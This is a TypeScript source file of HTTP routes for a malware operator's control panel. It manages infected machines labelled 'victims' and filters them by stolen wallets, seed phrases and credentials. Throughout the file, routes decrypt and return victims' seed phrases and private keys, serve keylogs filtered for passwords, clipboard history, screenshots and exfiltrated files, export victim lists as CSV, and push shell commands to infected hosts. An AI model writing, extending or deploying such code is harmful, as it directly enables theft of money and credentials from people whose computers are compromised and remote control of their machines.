import type { FastifyPluginAsync } from 'fastify';
import { z } from 'zod';
import { createReadStream } from 'node:fs';
import { rm, stat } from 'node:fs/promises';
import { join } from 'node:path';
import { prisma } from '../lib/db';
import { audit } from '../lib/audit';
import { openSecret } from '../lib/crypto';
import { HttpError, notFound } from '../lib/errors';
import { requireRole } from '../plugins/auth';
import { artifactDir, safeRel } from '../services/artifact';
import { rotateKey } from '../services/victim';
import { isOnline } from '../lib/presence';
import { publish } from '../lib/bus';
import { dispatchCommand, hasControl } from './ws';

function isWindowsOs(os: string | null | undefined): boolean {
  return /^win/i.test((os ?? '').trim());
}

const listQuery = z.object({
  q: z.string().max(128).optional(),
  os: z.string().max(32).optional(),
  country: z.string().max(64).optional(),
  status: z.enum(['online', 'stale', 'offline', 'revoked']).optional(),
  tag: z.string().max(64).optional(),
  build: z.string().uuid().optional(),
  linked: z.enum(['0', '1']).optional(),
  has: z.enum(['wallets', 'seeds', 'creds', 'balances', 'secrets']).optional(),
  cursor: z.string().uuid().optional(),
  limit: z.coerce.number().int().min(1).max(200).default(50)
});

export function hasWhere(has: z.infer<typeof listQuery>['has']) {
  switch (has) {
    case 'wallets':
      return { wallets: { some: {} } };
    case 'seeds':
      return { wallets: { some: { secrets: { some: { kind: { in: ['seed', 'mnemonic'] } } } } } };
    case 'secrets':
      return { wallets: { some: { secrets: { some: {} } } } };
    case 'creds':
      return { credentials: { some: {} } };
    case 'balances':
      return { wallets: { some: { AND: [{ NOT: { balance: null } }, { NOT: { balance: '0' } }] } } };
    default:
      return {};
  }
}

const tagSchema = z.object({ tags: z.array(z.string().max(32)).max(24) });

export function serializeVictim<T extends { wsSeqIn: bigint; wsSeqOut: bigint }>(row: T) {
  // Prisma maps BigInt columns to bigint and Fastify's serializer rejects them.
  return { ...row, wsSeqIn: Number(row.wsSeqIn), wsSeqOut: Number(row.wsSeqOut) };
}

export const victimRoutes: FastifyPluginAsync = async (app) => {
  app.get('/victims', async (request) => {
    const query = listQuery.parse(request.query);
    const rows = await prisma.victim.findMany({
      where: {
        ...(query.os ? { os: query.os } : {}),
        ...(query.country ? { country: query.country } : {}),
        ...(query.status ? { status: query.status } : {}),
        ...(query.tag ? { tags: { has: query.tag } } : {}),
        ...(query.build ? { buildId: query.build } : {}),
        ...hasWhere(query.has),
        ...(query.linked === '1' ? { discord: { isNot: null } } : {}),
        ...(query.linked === '0' ? { discord: { is: null } } : {}),
        ...(query.q
          ? {
              OR: [
                { hostname: { contains: query.q, mode: 'insensitive' } },
                { username: { contains: query.q, mode: 'insensitive' } },
                { ip: { contains: query.q } },
                { tags: { has: query.q } }
              ]
            }
          : {})
      },
      orderBy: [{ lastAgentMessageAt: 'desc' }, { lastHeartbeatAt: 'desc' }, { id: 'asc' }],
      ...(query.cursor ? { cursor: { id: query.cursor }, skip: 1 } : {}),
      take: query.limit,
      include: {
        build: { select: { name: true, version: true } },
        discord: { select: { channelId: true, missingAt: true } },
        _count: { select: { wallets: true, artifacts: true, credentials: true } }
      }
    });
    const failures = rows.length === 0 ? [] : await prisma.event.findMany({
      where: { victimId: { in: rows.map((row) => row.id) }, kind: 'module_degraded',
        createdAt: { gte: new Date(Date.now() - 10 * 60_000) } },
      orderBy: { createdAt: 'desc' }, select: { victimId: true, data: true }
    });
    const health = new Map<string, string>();
    for (const failure of failures) {
      if (!health.has(failure.victimId)) health.set(failure.victimId, String((failure.data as { key?: string }).key ?? 'error'));
    }
    return {
      items: rows.map((row) => ({
        ...serializeVictim(row),
        online: isOnline(row.lastHeartbeatAt, row.lastAgentMessageAt),
        socket: hasControl(row.id),
        wallets: row._count.wallets,
        artifacts: row._count.artifacts,
        credentials: row._count.credentials,
        health: health.get(row.id) ?? null,
        _count: undefined
      })),
      next: rows.length === query.limit ? rows.at(-1)?.id : null
    };
  });

  app.get('/victims/export.csv', async (request, reply) => {
    const query = listQuery.parse(request.query);
    const rows = await prisma.victim.findMany({
      where: {
        ...(query.os ? { os: query.os } : {}),
        ...(query.country ? { country: query.country } : {}),
        ...(query.status ? { status: query.status } : {}),
        ...hasWhere(query.has)
      },
      orderBy: { lastHeartbeatAt: 'desc' },
      take: 10000
    });
    const head = 'id,hostname,username,os,os_version,country,ip,status,profile,tags,first_seen,last_heartbeat\n';
    const body = rows
      .map((row) =>
        [
          row.id,
          row.hostname,
          row.username,
          row.os,
          row.osVersion,
          row.country ?? '',
          row.ip ?? '',
          row.status,
          row.profile,
          row.tags.join('|'),
          row.firstSeenAt.toISOString(),
          row.lastHeartbeatAt.toISOString()
        ]
          .map((value) => `"${String(value).replace(/"/g, '""')}"`)
          .join(',')
      )
      .join('\n');
    reply.header('content-type', 'text/csv; charset=utf-8');
    reply.header('content-disposition', 'attachment; filename="victims.csv"');
    await audit(prisma, { operatorId: request.operator?.id, action: 'export.victims', entity: 'victim', ip: request.clientIp });
    return head + body;
  });

  app.get('/victims/:id', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const victim = await prisma.victim.findUnique({
      where: { id },
      include: {
        build: { select: { id: true, name: true, version: true, buildId: true } },
        _count: { select: { wallets: true, artifacts: true, tasks: true, clipboard: true, keylogs: true, credentials: true } },
        discord: true
      }
    });
    if (!victim) throw notFound('victim');
    const balanceCount = await prisma.wallet.count({ where: { victimId: id, NOT: { balance: null } } });
    const ignored = victim.discord
      ? await prisma.discordIgnore.findUnique({ where: { channelId: victim.discord.channelId } })
      : null;
    return {
      ...serializeVictim(victim),
      discordChannel: victim.discord?.channelId ?? null,
      discordMissingAt: victim.discord?.missingAt ?? null,
      discordIgnored: Boolean(ignored),
      online: isOnline(victim.lastHeartbeatAt, victim.lastAgentMessageAt),
      socket: hasControl(victim.id),
      balances: balanceCount
    };
  });

  app.patch('/victims/:id', { preHandler: requireRole('operator') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const input = tagSchema.parse(request.body);
    const victim = await prisma.victim.update({ where: { id }, data: { tags: input.tags }, select: { id: true, tags: true } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'victim.tags', entity: 'victim', entityId: id, ip: request.clientIp, data: { tags: input.tags } });
    return victim;
  });

  app.post('/victims/:id/revoke', { preHandler: requireRole('operator') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const restored = (request.query as { restore?: string }).restore === '1';
    const revoked = restored ? null : new Date();
    await prisma.$transaction(async (tx) => {
      await tx.victim.update({ where: { id }, data: { revokedAt: revoked, status: revoked ? 'revoked' : 'offline' } });
      await audit(tx, { operatorId: request.operator?.id, action: revoked ? 'victim.revoke' : 'victim.restore', entity: 'victim', entityId: id, ip: request.clientIp });
    });
    void publish({ type: 'victim.heartbeat', victimId: id, at: Date.now(), data: { status: revoked ? 'revoked' : 'offline' } });
    return { ok: true, revoked: Boolean(revoked) };
  });

  /**
   * Explicit, audited salt rotation. Old outbox entries and in-flight artifacts
   * stay readable through the epoch history (three epochs).
   */
  app.post('/victims/:id/rotate-key', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const victim = await prisma.victim.findUnique({ where: { id }, select: { id: true, keyScheme: true, revokedAt: true } });
    if (!victim) throw notFound('victim');
    if (victim.revokedAt) throw new HttpError(409, 'revoked', 're-enroll before rotating');
    if (victim.keyScheme !== 2) throw new HttpError(409, 'key_scheme_1', 'legacy scheme has no per-device salt');
    const rotated = await rotateKey(id, request.operator?.id, request.clientIp);
    return { ok: true, ...rotated };
  });

  app.delete('/victims/:id', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const victim = await prisma.victim.findUnique({ where: { id }, include: { discord: true } });
    if (!victim) throw notFound('victim');
    await prisma.$transaction(async (tx) => {
      if (victim.discord) {
        await tx.discordIgnore.upsert({
          where: { channelId: victim.discord.channelId },
          update: { reason: `deleted ${victim.hostname} (${victim.id})` },
          create: { channelId: victim.discord.channelId, reason: `deleted ${victim.hostname} (${victim.id})` }
        });
        // The link cascades with the victim; keep the ignore row so the next
        // sweep does not recreate the victim from the live channel.
      }
      await tx.victim.delete({ where: { id } });
      await audit(tx, {
        operatorId: request.operator?.id,
        action: 'victim.delete',
        entity: 'victim',
        entityId: id,
        ip: request.clientIp,
        data: { hostname: victim.hostname, channelId: victim.discord?.channelId ?? null, ignored: Boolean(victim.discord) }
      });
    });
    void publish({ type: 'victim.heartbeat', victimId: id, at: Date.now(), data: { deleted: true } });
    return { ok: true, ignoredChannel: victim.discord?.channelId ?? null };
  });

  app.delete('/artifacts/:id', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const artifact = await prisma.artifact.findUnique({ where: { id } });
    if (!artifact) throw notFound('artifact');
    const counts = await prisma.$transaction(async (tx) => {
      const wallets = await tx.wallet.deleteMany({ where: { artifactId: id } });
      const screenshots = await tx.screenshot.deleteMany({ where: { artifactId: id } });
      await tx.artifact.delete({ where: { id } });
      await audit(tx, {
        operatorId: request.operator?.id,
        action: 'artifact.delete',
        entity: 'artifact',
        entityId: id,
        ip: request.clientIp,
        data: { module: artifact.module, bytes: artifact.bytes, wallets: wallets.count, screenshots: screenshots.count }
      });
      return { wallets: wallets.count, screenshots: screenshots.count };
    });
    await rm(artifactDir(id), { recursive: true, force: true }).catch(() => undefined);
    await rm(artifact.containerPath, { force: true }).catch(() => undefined);
    return { ok: true, ...counts };
  });

  app.get('/victims/:id/wallets', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const items = await prisma.wallet.findMany({ where: { victimId: id }, orderBy: [{ state: 'asc' }, { createdAt: 'desc' }], take: 1000 });
    return { items };
  });

  app.get('/victims/:id/clipboard', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const query = z.object({ q: z.string().max(256).default(''), cursor: z.string().optional(), limit: z.coerce.number().int().max(200).default(100) }).parse(request.query);
    const items = await prisma.clipboardEntry.findMany({
      where: { victimId: id, ...(query.q ? { content: { contains: query.q, mode: 'insensitive' } } : {}) },
      orderBy: { ts: 'desc' },
      take: query.limit,
      ...(query.cursor ? { cursor: { id: query.cursor }, skip: 1 } : {})
    });
    return { items, next: items.length === query.limit ? items.at(-1)?.id : null };
  });

  app.get('/victims/:id/diagnostics', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const victim = await prisma.victim.findUnique({ where: { id }, select: { id: true, agentVersion: true, status: true, lastHeartbeatAt: true } });
    if (!victim) throw notFound('victim');
    const events = await prisma.event.findMany({
      where: { victimId: id, kind: { in: ['task_failed', 'module_degraded', 'artifact_failed', 'outbox_dropped', 'sandbox_suspected'] } },
      orderBy: { createdAt: 'desc' }, take: 50
    });
    return { victim, items: events };
  });

  app.get('/victims/:id/keylogs', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const query = z.object({ q: z.string().max(256).default(''), password: z.enum(['0', '1']).default('0'), limit: z.coerce.number().int().max(500).default(200) }).parse(request.query);
    const items = await prisma.keylog.findMany({
      where: {
        victimId: id,
        ...(query.password === '1' ? { password: true } : {}),
        ...(query.q ? { OR: [{ text: { contains: query.q, mode: 'insensitive' } }, { title: { contains: query.q, mode: 'insensitive' } }] } : {})
      },
      orderBy: { ts: 'desc' },
      take: query.limit
    });
    return { items };
  });

  app.get('/victims/:id/seeds', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const secrets = await prisma.walletSecret.findMany({
      where: { wallet: { victimId: id }, kind: { in: ['seed', 'mnemonic', 'private_key', 'passphrase'] } },
      orderBy: { updatedAt: 'desc' },
      take: 1000,
      include: { wallet: { select: { id: true, path: true, targetId: true } } }
    });
    return {
      items: secrets.map((secret) => {
        let value = '';
        try {
          value = secret.valueEnc ? openSecret(secret.valueEnc) : '';
        } catch {
          value = '';
        }
        return {
          id: secret.id,
          walletId: secret.wallet.id,
          path: secret.wallet.path,
          target: secret.wallet.targetId,
          type: secret.kind,
          words: secret.words ?? 0,
          value,
          createdAt: secret.firstSeenAt
        };
      })
    };
  });

  app.get('/victims/:id/events', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const query = z.object({ kind: z.string().max(64).optional() }).parse(request.query);
    const items = await prisma.event.findMany({
      where: { victimId: id, ...(query.kind ? { kind: query.kind } : {}) },
      orderBy: { createdAt: 'desc' },
      take: 500
    });
    return { items };
  });

  app.get('/victims/:id/chat', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const items = await prisma.event.findMany({
      where: { victimId: id, kind: { in: ['chat_out', 'chat_in'] } },
      orderBy: { createdAt: 'asc' },
      take: 200
    });
    return { items };
  });

  /** Chat del operador. Usa el message box del SO y guarda el hilo en `events`. */
  app.post('/victims/:id/chat', { preHandler: requireRole('operator') }, async (request, reply) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const { text } = z.object({ text: z.string().trim().min(1).max(1000) }).parse(request.body);
    const victim = await prisma.victim.findUnique({ where: { id }, select: { id: true, hostname: true, os: true, revokedAt: true } });
    if (!victim) throw notFound('victim');
    const safe = text.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/'/g, "''").replace(/\r?\n/g, ' ');
    const command = isWindowsOs(victim.os)
      ? `powershell -NoProfile -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\\"${safe}\\",\\"SPC · ${victim.hostname}\\")"`
      : `sh -c "zenity --info --title='SPC · ${victim.hostname}' --text='${safe}' 2>/dev/null || notify-send 'SPC · ${victim.hostname}' '${safe}'"`;

    const event = await prisma.event.create({
      data: { victimId: id, kind: 'chat_out', data: { text, channel: 'panel' } as never, legacy: text }
    });
    if (victim.revokedAt || !hasControl(id)) {
      return reply.code(409).send({ event, taskId: null, delivered: false, error: 'agent_offline' });
    }
    const task = await prisma.task.create({
      data: { victimId: id, name: 'shell', params: { command } as never, timeoutSec: 60, priority: 1, createdById: request.operator!.id }
    });
    const delivered = await dispatchCommand(task).catch(() => false);
    if (!delivered) {
      await prisma.task.updateMany({ where: { id: task.id, status: 'queued' }, data: { status: 'error', error: 'agent_offline', finishedAt: new Date(), leaseUntil: null } });
    }
    await audit(prisma, { operatorId: request.operator?.id, action: 'victim.chat', entity: 'victim', entityId: id, ip: request.clientIp, data: { task: task.id, chars: text.length } });
    void publish({ type: 'task.update', victimId: id, at: Date.now(), data: { id: task.id, name: 'shell', status: delivered ? 'queued' : 'error' } });
    return reply.code(201).send({ event, taskId: task.id, delivered });
  });

  app.get('/victims/:id/files', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const artifacts = await prisma.artifact.findMany({
      where: { victimId: id, status: 'ready', module: { not: 'result' } },
      orderBy: { createdAt: 'desc' },
      take: 50,
      select: { id: true, module: true, bytes: true, manifest: true, createdAt: true }
    });
    return {
      artifacts: artifacts.map((artifact) => ({
        id: artifact.id,
        module: artifact.module,
        bytes: artifact.bytes,
        createdAt: artifact.createdAt,
        files: ((artifact.manifest as { artifacts?: Array<{ path: string; size: number; kind: string }> } | null)?.artifacts ?? []).map((file) => ({
          path: file.path,
          size: file.size,
          kind: file.kind
        }))
      }))
    };
  });

  app.get('/victims/:id/screenshots', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const items = await prisma.screenshot.findMany({ where: { victimId: id }, orderBy: { ts: 'desc' }, take: 200 });
    return { items };
  });

  app.get('/artifacts/:id/file', async (request, reply) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const filePath = String((request.query as { path?: string }).path ?? '');
    if (!filePath) throw notFound('file');
    const artifact = await prisma.artifact.findUnique({ where: { id } });
    if (!artifact || artifact.status !== 'ready') throw notFound('artifact');
    const manifest = artifact.manifest as { artifacts?: Array<{ path: string; size: number }> } | null;
    const entry = manifest?.artifacts?.find((item) => item.path === filePath);
    if (!entry) throw notFound('file');
    const full = join(artifactDir(artifact.id), safeRel(entry.path));
    const info = await stat(full);
    reply.header('content-type', 'application/octet-stream');
    reply.header('content-length', info.size);
    reply.header('content-disposition', `attachment; filename="${encodeURIComponent(entry.path.split('/').pop() ?? 'file')}"`);
    return reply.send(createReadStream(full));
  });

  app.get('/artifacts/:id/raw', async (request, reply) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const artifact = await prisma.artifact.findUnique({ where: { id } });
    if (!artifact) throw notFound('artifact');
    reply.header('content-type', 'application/octet-stream');
    return reply.send(createReadStream(artifact.containerPath));
  });

  app.get('/screenshots/:id/image', async (request, reply) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const shot = await prisma.screenshot.findUnique({ where: { id }, include: { artifact: true } });
    if (!shot) throw notFound('screenshot');
    const manifest = shot.artifact.manifest as { artifacts?: Array<{ path: string; kind: string }> } | null;
    const entry = manifest?.artifacts?.find((item) => item.kind === 'screenshot') ?? manifest?.artifacts?.[0];
    if (!entry) throw notFound('screenshot');
    reply.header('content-type', 'image/png');
    return reply.send(createReadStream(join(artifactDir(shot.artifactId), safeRel(entry.path))));
  });
};
